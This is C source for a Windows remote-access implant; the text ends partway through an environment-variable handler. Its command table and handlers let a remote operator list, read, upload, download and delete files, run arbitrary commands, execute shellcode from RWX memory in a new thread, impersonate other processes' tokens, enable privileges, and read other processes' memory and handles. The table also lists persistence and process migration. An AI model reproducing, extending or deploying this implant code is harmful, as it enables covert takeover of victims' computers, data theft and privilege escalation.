#include <windows.h>
#include <winsock2.h>
#include "command.h"
#include "security.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <strsafe.h>

#pragma comment(lib, "psapi.lib")

#define UTF8_WIDE_NULL_TERMINATOR_COUNT 1U
#define SHELLCODE_MAX_SIZE (10 * 1024 * 1024)

CONST COMMAND_MAP G_CommandTable[] = {
	// Filesystem
	{ CMD_LS,                CmdLs },
	{ CMD_CAT,               CmdCat },
	{ CMD_MKDIR,             CmdMkdir },
	{ CMD_RM,                CmdRm },
	{ CMD_UPLOAD,            CmdUpload },
	{ CMD_DOWNLOAD,          CmdDownload },

	// System Enumeration
	{ CMD_PS,                CmdPs },
	{ CMD_WHOAMI,            CmdWhoami },
	{ CMD_HOSTNAME,          CmdHostname },
	{ CMD_GETPID,            CmdGetPid },

	// Execution
	{ CMD_EXEC,              CmdExec },
	{ CMD_SHELLCODEEXEC,     CmdShellcodeExec },

	// Token Manipulation
	{ CMD_INSPECT_TOKEN,     CmdCurrentToken },
	{ CMD_PROCESS_TOKEN,     CmdProcessToken },
	{ CMD_TOKEN_PRIVILEGES,  CmdTokenPrivileges },
	{ CMD_TOKEN_IMPERSONATE, CmdImpersonateToken },
	{ CMD_ENABLE_PRIVILEGE,  CmdEnablePrivilege },
	{ CMD_DISABLE_PRIVILEGE, CmdDisablePrivilege },

	// Memory and Object Inspection
	{ CMD_MEMREAD,           CmdMemRead },
	{ CMD_MODULELIST,        CmdModuleList },
	{ CMD_HANDLELIST,        CmdHandleList },

	// Environment
	{ CMD_ENV,               CmdEnv },
	{ CMD_GETENV,            CmdGetEnv },
	{ CMD_SETENV,            CmdSetEnv },

	// Implant Management
	{ CMD_SLEEP,             CmdSleep },
	{ CMD_KILL,              CmdKillImplant },
	{ CMD_PERSIST,           CmdPersist },
	{ CMD_UNPERSIST,         CmdUnpersist },
	{ CMD_MIGRATE,           CmdMigrate }
};

static DWORD ConvertUtf8ToWideString(DWORD dataLen, CONST PBYTE data, PWSTR* wideString)
{
	INT wideCharCount = 0;
	PWSTR buffer = NULL;

	ASSERT(wideString != NULL);

	*wideString = NULL;
	if (data == NULL || dataLen == 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	wideCharCount = MultiByteToWideChar(CP_UTF8, 0, (LPCCH)data, (INT)dataLen, NULL, 0);
	if (wideCharCount <= 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	buffer = (PWSTR)ImplantHeapAlloc(((SIZE_T)wideCharCount + UTF8_WIDE_NULL_TERMINATOR_COUNT) * sizeof(WCHAR));
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	if (MultiByteToWideChar(CP_UTF8, 0, (LPCCH)data, (INT)dataLen, buffer, wideCharCount) <= 0)
	{
		ImplantHeapFree(buffer);
		return ERROR_INVALID_REQUEST;
	}

	buffer[wideCharCount] = L'\0';
	*wideString = buffer;
	return NO_ERROR;
}

DWORD ExecuteCommandById(DWORD cmdId, DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	for (DWORD i = 0; i < ARRAYSIZE(G_CommandTable); i++)
	{
		if ((DWORD)G_CommandTable[i].id == cmdId)
		{
			return G_CommandTable[i].handler(
				dataLen,
				data,
				responseData,
				responseLen
			);
		}
	}

	return ERROR_UNKNOWN_COMMAND;
}


//############################################### Filesystem LS 
DWORD CmdLs(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = ListDirectory(path, responseData, responseLen);
	ImplantHeapFree(path);
	return status;
}

DWORD CmdCat(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = ReadFileContents(path, responseData, responseLen);
	ImplantHeapFree(path);
	return status;
}

DWORD CmdMkdir(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;
	PBYTE buffer = NULL;
	DWORD pathBytes = 0;
	DWORD totalLength = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = CreateDirectory_(path);

	pathBytes = (DWORD)(wcslen(path) + 1) * sizeof(WCHAR);
	totalLength = sizeof(DWORD) + pathBytes;

	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (buffer == NULL)
	{
		ImplantHeapFree(path);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)buffer = status;
	CopyMemory(buffer + sizeof(DWORD), path, pathBytes);
	ImplantHeapFree(path);

	*responseData = buffer;
	*responseLen = totalLength;
	return NO_ERROR;
}

DWORD CmdRm(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;
	PBYTE buffer = NULL;
	DWORD pathBytes = 0;
	DWORD totalLength = 0;
	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;
	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}
	status = DeletePath(path);
	pathBytes = (DWORD)(wcslen(path) + 1) * sizeof(WCHAR);
	totalLength = sizeof(DWORD) + pathBytes;
	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (buffer == NULL)
	{
		ImplantHeapFree(path);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}
	*(DWORD*)buffer = status;
	CopyMemory(buffer + sizeof(DWORD), path, pathBytes);
	ImplantHeapFree(path);
	*responseData = buffer;
	*responseLen = totalLength;
	return NO_ERROR;
}

// system enumeration ###############################################################
DWORD CmdPs(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	HANDLE snapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32W entry;
	DWORD entryCount = 0;
	DWORD bufferSize = sizeof(DWORD);
	DWORD offset = 0;
	PBYTE buffer = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	entry.dwSize = sizeof(PROCESSENTRY32W);

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
	{
		return ERROR_LIST_PROCESSES_FAILED;
	}

	if (Process32FirstW(snapshot, &entry))
	{
		do
		{
			DWORD nameBytes =
				((DWORD)wcslen(entry.szExeFile) + 1) * sizeof(WCHAR);
			bufferSize += sizeof(DWORD) + sizeof(DWORD) + nameBytes;
			entryCount++;
		} while (Process32NextW(snapshot, &entry));
	}

	CloseHandle(snapshot);
	snapshot = INVALID_HANDLE_VALUE;

	buffer = (PBYTE)ImplantHeapAlloc(bufferSize);
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)(buffer + offset) = entryCount;
	offset += sizeof(DWORD);

	entry.dwSize = sizeof(PROCESSENTRY32W);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
	{
		ImplantHeapFree(buffer);
		return ERROR_LIST_PROCESSES_FAILED;
	}

	if (Process32FirstW(snapshot, &entry))
	{
		do
		{
			DWORD nameBytes =
				((DWORD)wcslen(entry.szExeFile) + 1) * sizeof(WCHAR);

			if (offset + sizeof(DWORD) + sizeof(DWORD) + nameBytes > bufferSize)
			{
				break;
			}

			*(DWORD*)(buffer + offset) = entry.th32ProcessID;
			offset += sizeof(DWORD);

			*(DWORD*)(buffer + offset) = nameBytes;
			offset += sizeof(DWORD);

			CopyMemory(buffer + offset, entry.szExeFile, nameBytes);
			offset += nameBytes;
		} while (Process32NextW(snapshot, &entry));
	}

	CloseHandle(snapshot);

	*responseData = buffer;
	*responseLen = offset;
	return NO_ERROR;
}

DWORD CmdWhoami(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);
	return BuildCurrentUserResponse(responseData, responseLen);
}

DWORD CmdHostname(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	WCHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD nameLen = MAX_COMPUTERNAME_LENGTH + 1;
	DWORD nameBytes = 0;
	DWORD totalLength = 0;
	PBYTE buffer = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	if (!GetComputerNameW(hostName, &nameLen))
	{
		return ERROR_GET_HOSTNAME_FAILED;
	}

	nameBytes = (nameLen + 1) * sizeof(WCHAR);
	totalLength = sizeof(DWORD) + nameBytes;

	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)buffer = nameBytes;
	CopyMemory(buffer + sizeof(DWORD), hostName, nameBytes);

	*responseData = buffer;
	*responseLen = totalLength;
	return NO_ERROR;
}

DWORD CmdGetPid(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	PBYTE buffer = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	buffer = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)buffer = GetCurrentProcessId();

	*responseData = buffer;
	*responseLen = sizeof(DWORD);
	return NO_ERROR;
}



//execution
// would be env, shellstuff, etc 

DWORD CmdExec(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR cmdLine = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &cmdLine);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = ExecCommand(cmdLine, responseData, responseLen);
	ImplantHeapFree(cmdLine);
	return status;
}

//token manpulation ###############################################################
DWORD CmdCurrentToken(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
}

DWORD CmdProcessToken(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD processId = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return BuildProcessTokenSummaryResponse(processId, responseData, responseLen);
}

DWORD CmdTokenPrivileges(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD processId = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return BuildTokenPrivilegesResponse(processId, responseData, responseLen);
}

DWORD CmdImpersonateToken(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD processId = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return ImpersonateProcessToken(processId, responseData, responseLen);
}

DWORD CmdEnablePrivilege(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR privilegeName = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = EnableCurrentTokenPrivilege(privilegeName, responseData, responseLen);
	ImplantHeapFree(privilegeName);
	return status;
}

// same as enable but sets attribute to 0
DWORD CmdDisablePrivilege(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR privilegeName = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = DisableCurrentTokenPrivilege(privilegeName, responseData, responseLen);
	ImplantHeapFree(privilegeName);
	return status;
}

//############################################### KILL IMPLANT ###############################################
DWORD CmdKillImplant(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	*responseData = NULL;
	*responseLen = 0;
	RequestImplantTermination();

	return NO_ERROR;
}

//############################################### UPLOAD / DOWNLOAD ###############################################

// matches client_api.py encode_upload_chunk wire format
// [PathLen:DWORD][PathUTF16LE][Offset:QWORD][DataLen:DWORD][Data]
DWORD CmdUpload(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD pathBytes = 0;
	PWSTR remotePath = NULL;
	LARGE_INTEGER li = { 0 };
	DWORD chunkLen = 0;
	PBYTE chunkData = NULL;
	HANDLE fileHandle = INVALID_HANDLE_VALUE;
	DWORD bytesWritten = 0;
	DWORD status = NO_ERROR;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (data == NULL || dataLen < sizeof(DWORD))
	{
		return ERROR_INVALID_REQUEST;
	}

	pathBytes = *(DWORD*)data;
	if (dataLen < sizeof(DWORD) + pathBytes + sizeof(ULONGLONG) + sizeof(DWORD))
	{
		return ERROR_INVALID_REQUEST;
	}

	remotePath = (PWSTR)ImplantHeapAlloc(pathBytes + sizeof(WCHAR));
	if (remotePath == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}
	CopyMemory(remotePath, data + sizeof(DWORD), pathBytes);

	li.QuadPart = *(ULONGLONG*)(data + sizeof(DWORD) + pathBytes);
	chunkLen = *(DWORD*)(data + sizeof(DWORD) + pathBytes + sizeof(ULONGLONG));
	chunkData = data + sizeof(DWORD) + pathBytes + sizeof(ULONGLONG) + sizeof(DWORD);

	if (dataLen < sizeof(DWORD) + pathBytes + sizeof(ULONGLONG) + sizeof(DWORD) + chunkLen)
	{
		ImplantHeapFree(remotePath);
		return ERROR_INVALID_REQUEST;
	}

	// CREATE_ALWAYS for first chunk (offset 0), OPEN_EXISTING for subsequent
	fileHandle = CreateFileW(
		remotePath,
		GENERIC_WRITE,
		0,
		NULL,
		(li.QuadPart == 0) ? CREATE_ALWAYS : OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (fileHandle == INVALID_HANDLE_VALUE)
	{
		ImplantHeapFree(remotePath);
		return ERROR_OPEN_FILE_FAILED;
	}

	if (li.QuadPart != 0 && !SetFilePointerEx(fileHandle, li, NULL, FILE_BEGIN))
	{
		status = ERROR_WRITE_FILE_FAILED;
		goto upload_cleanup;
	}

	if (chunkLen > 0 && !WriteFile(fileHandle, chunkData, chunkLen, &bytesWritten, NULL))
	{
		status = ERROR_WRITE_FILE_FAILED;
	}

upload_cleanup:
	CloseHandle(fileHandle);
	ImplantHeapFree(remotePath);
	return status;
}

// path comes in as raw UTF-16LE bytes (same encoding security.c uses for Windows FS calls)
// returns [FileSize:DWORD][Bytes] same as CmdCat
DWORD CmdDownload(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD wideChars = 0;
	PWSTR path = NULL;
	DWORD status = NO_ERROR;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (data == NULL || dataLen < sizeof(WCHAR) || (dataLen % sizeof(WCHAR)) != 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	wideChars = dataLen / sizeof(WCHAR);
	path = (PWSTR)ImplantHeapAlloc(((SIZE_T)wideChars + 1) * sizeof(WCHAR));
	if (path == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	CopyMemory(path, data, dataLen);
	path[wideChars] = L'\0';

	status = ReadFileContents(path, responseData, responseLen);
	ImplantHeapFree(path);
	return status;
}

//############################################### SHELLCODE EXEC ###############################################

// reads shellcode from disk path (UTF-8), allocs RWX, copies, runs in new thread, waits
// returns [ExitCode:DWORD]
DWORD CmdShellcodeExec(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;
	PBYTE scBuf = NULL;
	DWORD scLen = 0;
	PBYTE rxMem = NULL;
	HANDLE hThread = NULL;
	DWORD exitCode = 0;
	PBYTE resultBuf = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}

	// ReadFileContents returns [FileSize:DWORD][Bytes]
	status = ReadFileContents(path, &scBuf, &scLen);
	ImplantHeapFree(path);
	if (status != NO_ERROR)
	{
		return status;
	}

	if (scLen < sizeof(DWORD))
	{
		ImplantHeapFree(scBuf);
		return ERROR_INVALID_REQUEST;
	}

	DWORD fileSize = *(DWORD*)scBuf;
	if (fileSize == 0 || fileSize > SHELLCODE_MAX_SIZE)
	{
		ImplantHeapFree(scBuf);
		return ERROR_INVALID_REQUEST;
	}

	rxMem = (PBYTE)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (rxMem == NULL)
	{
		ImplantHeapFree(scBuf);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	CopyMemory(rxMem, scBuf + sizeof(DWORD), fileSize);
	ImplantHeapFree(scBuf);

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rxMem, NULL, 0, NULL);
	if (hThread == NULL)
	{
		VirtualFree(rxMem, 0, MEM_RELEASE);
		return ERROR_EXEC_FAILED;
	}

	WaitForSingleObject(hThread, INFINITE);
	GetExitCodeThread(hThread, &exitCode);
	CloseHandle(hThread);
	VirtualFree(rxMem, 0, MEM_RELEASE);

	resultBuf = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
	if (resultBuf != NULL)
	{
		*(DWORD*)resultBuf = exitCode;
		*responseData = resultBuf;
		*responseLen = sizeof(DWORD);
	}

	return NO_ERROR;
}

//############################################### MEMORY INSPECTION ###############################################

// [PID:DWORD][Addr:QWORD][Size:DWORD] -> [BytesRead:DWORD][Bytes]
DWORD CmdMemRead(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD processId = 0;
	ULONGLONG address = 0;
	DWORD size = 0;
	HANDLE hProcess = NULL;
	PBYTE readBuf = NULL;
	SIZE_T bytesRead = 0;
	PBYTE finalBuf = NULL;
	DWORD finalLen = 0;
	DWORD status = NO_ERROR;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (dataLen < sizeof(DWORD) + sizeof(ULONGLONG) + sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	address = *(ULONGLONG*)(data + sizeof(DWORD));
	size = *(DWORD*)(data + sizeof(DWORD) + sizeof(ULONGLONG));

	if (size == 0 || size > 64 * 1024 * 1024)
	{
		return ERROR_INVALID_REQUEST;
	}

	hProcess = OpenProcess(PROCESS_VM_READ, FALSE, processId);
	if (hProcess == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	readBuf = (PBYTE)ImplantHeapAlloc(size);
	if (readBuf == NULL)
	{
		CloseHandle(hProcess);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	if (!ReadProcessMemory(hProcess, (LPCVOID)(ULONG_PTR)address, readBuf, size, &bytesRead))
	{
		status = ERROR_READ_FILE_FAILED;
		bytesRead = 0;
	}

	CloseHandle(hProcess);

	finalLen = sizeof(DWORD) + (DWORD)bytesRead;
	finalBuf = (PBYTE)ImplantHeapAlloc(finalLen);
	if (finalBuf == NULL)
	{
		ImplantHeapFree(readBuf);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)finalBuf = (DWORD)bytesRead;
	if (bytesRead > 0)
	{
		CopyMemory(finalBuf + sizeof(DWORD), readBuf, bytesRead);
	}

	ImplantHeapFree(readBuf);
	*responseData = finalBuf;
	*responseLen = finalLen;
	return (status == NO_ERROR && bytesRead > 0) ? NO_ERROR : status;
}


DWORD CmdModuleList(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD processId = 0;
	HANDLE hProcess = NULL;
	HMODULE mods[1024] = { 0 };
	DWORD needed = 0;
	DWORD modCount = 0;
	DWORD bufSize = sizeof(DWORD) + sizeof(DWORD);
	PBYTE finalBuf = NULL;
	DWORD offset = 0;
	WCHAR modName[MAX_PATH];

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
	if (hProcess == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	if (!EnumProcessModulesEx(hProcess, mods, sizeof(mods), &needed, LIST_MODULES_ALL))
	{
		CloseHandle(hProcess);
		return ERROR_LIST_PROCESSES_FAILED;
	}

	modCount = needed / sizeof(HMODULE);

	for (DWORD i = 0; i < modCount; i++)
	{
		DWORD nameLen = GetModuleFileNameExW(hProcess, mods[i], modName, MAX_PATH);
		if (nameLen > 0)
		{
			bufSize += sizeof(ULONGLONG) + sizeof(DWORD) + (nameLen + 1) * sizeof(WCHAR);
		}
	}

	finalBuf = (PBYTE)ImplantHeapAlloc(bufSize);
	if (finalBuf == NULL)
	{
		CloseHandle(hProcess);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)(finalBuf + offset) = processId;  offset += sizeof(DWORD);
	*(DWORD*)(finalBuf + offset) = modCount;   offset += sizeof(DWORD);

	for (DWORD i = 0; i < modCount; i++)
	{
		DWORD nameLen = GetModuleFileNameExW(hProcess, mods[i], modName, MAX_PATH);
		if (nameLen == 0)
		{
			continue;
		}

		ULONGLONG base = (ULONGLONG)(ULONG_PTR)mods[i];
		DWORD nameBytes = (nameLen + 1) * sizeof(WCHAR);

		if (offset + sizeof(ULONGLONG) + sizeof(DWORD) + nameBytes > bufSize)
		{
			break;
		}

		*(ULONGLONG*)(finalBuf + offset) = base;      offset += sizeof(ULONGLONG);
		*(DWORD*)(finalBuf + offset) = nameBytes;     offset += sizeof(DWORD);
		CopyMemory(finalBuf + offset, modName, nameBytes);
		offset += nameBytes;
	}

	CloseHandle(hProcess);
	*responseData = finalBuf;
	*responseLen = offset;
	return NO_ERROR;
}

// NtQuerySystemInformation structs for handle enumeration
typedef struct _SYSTEM_HANDLE_ENTRY {
	ULONG OwnerPid;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT HandleValue;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG HandleCount;
	SYSTEM_HANDLE_ENTRY Handles[1];
} SYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS (NTAPI *PfnNtQuerySystemInformation)(
	ULONG  SystemInformationClass,
	PVOID  SystemInformation,
	ULONG  SystemInformationLength,
	PULONG ReturnLength
);


// uses NtQuerySystemInformation(16) to enumerate all system handles then filters by PID
DWORD CmdHandleList(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD processId = 0;
	HANDLE hProcess = NULL;
	PBYTE hInfoBuf = NULL;
	ULONG hInfoSize = 1024 * 64;
	ULONG retLen = 0;
	NTSTATUS ntStatus = 0;
	PBYTE outBuf = NULL;
	DWORD outSize = sizeof(DWORD) + sizeof(DWORD);
	DWORD offset = 0;
	DWORD validCount = 0;
	WCHAR typeName[64];
	WCHAR objName[260];
	PfnNtQuerySystemInformation NtQuerySystemInformation = NULL;
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
	*responseLen = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;

	if (hNtdll == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	NtQuerySystemInformation = (PfnNtQuerySystemInformation)
		GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, processId);
	if (hProcess == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	// grow buffer until NtQuerySystemInformation fits
	do {
		ImplantHeapFree(hInfoBuf);
		hInfoSize *= 2;
		hInfoBuf = (PBYTE)ImplantHeapAlloc(hInfoSize);
		if (hInfoBuf == NULL)
		{
			CloseHandle(hProcess);
			return ERROR_MEMORY_ALLOCATION_FAILED;
		}
		ntStatus = NtQuerySystemInformation(16, hInfoBuf, hInfoSize, &retLen);
	} while (ntStatus == (NTSTATUS)0xC0000004L); // STATUS_INFO_LENGTH_MISMATCH

	if (ntStatus != 0)
	{
		ImplantHeapFree(hInfoBuf);
		CloseHandle(hProcess);
		return ERROR_INVALID_REQUEST;
	}

	SYSTEM_HANDLE_INFORMATION* shi = (SYSTEM_HANDLE_INFORMATION*)hInfoBuf;

	// first pass: estimate output buffer size
	for (ULONG i = 0; i < shi->HandleCount; i++)
	{
		if (shi->Handles[i].OwnerPid != processId)
		{
			continue;
		}
		outSize += sizeof(ULONGLONG) + sizeof(DWORD) + 64 * sizeof(WCHAR)
		         + sizeof(DWORD) + 260 * sizeof(WCHAR);
	}

	outBuf = (PBYTE)ImplantHeapAlloc(outSize);
	if (outBuf == NULL)
	{
		ImplantHeapFree(hInfoBuf);
		CloseHandle(hProcess);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	offset += sizeof(DWORD) + sizeof(DWORD); // header space

	for (ULONG i = 0; i < shi->HandleCount; i++)
	{
		SYSTEM_HANDLE_ENTRY* entry = &shi->Handles[i];
		if (entry->OwnerPid != processId)
		{
			continue;
		}

		HANDLE dupHandle = NULL;
		if (!DuplicateHandle(
			hProcess,
			(HANDLE)(ULONG_PTR)entry->HandleValue,
			GetCurrentProcess(),
			&dupHandle,
			0, FALSE, DUPLICATE_SAME_ACCESS))
		{
			continue;
		}

		typeName[0] = L'\0';
		objName[0] = L'\0';

		// classify by GetFileType — good enough for files and pipes
		DWORD ft = GetFileType(dupHandle);
		if (ft == FILE_TYPE_DISK)
		{
			StringCchCopyW(typeName, 64, L"File");
			GetFinalPathNameByHandleW(dupHandle, objName, 260, FILE_NAME_NORMALIZED);
		}
		else if (ft == FILE_TYPE_PIPE)
		{
			StringCchCopyW(typeName, 64, L"Pipe");
		}
		else
		{
			StringCchCopyW(typeName, 64, L"Unknown");
		}

		CloseHandle(dupHandle);

		DWORD typeNameBytes = ((DWORD)wcslen(typeName) + 1) * sizeof(WCHAR);
		DWORD nameBytes = ((DWORD)wcslen(objName) + 1) * sizeof(WCHAR);

		if (offset + sizeof(ULONGLONG) + sizeof(DWORD) + typeNameBytes + sizeof(DWORD) + nameBytes > outSize)
		{
			break;
		}

		ULONGLONG hVal = (ULONGLONG)(ULONG_PTR)entry->HandleValue;
		*(ULONGLONG*)(outBuf + offset) = hVal;            offset += sizeof(ULONGLONG);
		*(DWORD*)(outBuf + offset) = typeNameBytes;        offset += sizeof(DWORD);
		CopyMemory(outBuf + offset, typeName, typeNameBytes); offset += typeNameBytes;
		*(DWORD*)(outBuf + offset) = nameBytes;            offset += sizeof(DWORD);
		CopyMemory(outBuf + offset, objName, nameBytes);   offset += nameBytes;
		validCount++;
	}

	*(DWORD*)outBuf = processId;
	*(DWORD*)(outBuf + sizeof(DWORD)) = validCount;

	ImplantHeapFree(hInfoBuf);
	CloseHandle(hProcess);

	*responseData = outBuf;
	*responseLen = offset;
	return NO_ERROR;
}

//############################################### ENVIRONMENT ###############################################

DWORD CmdEnv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	return GetEnvironmentBlock(responseData, responseLen);
}

// UTF-8 var name in -> [ValueLenBytes:DWORD][ValueUTF16LE]
DWORD CmdGetEnv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	PWSTR varName = NULL;
	WCHAR valueBuf[32767];
	DWORD valueLen = 0;
	DWORD valueBytes = 0;
	PBYTE finalBuf = NULL;
	DWORD finalLen = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);
	*responseData = NULL;
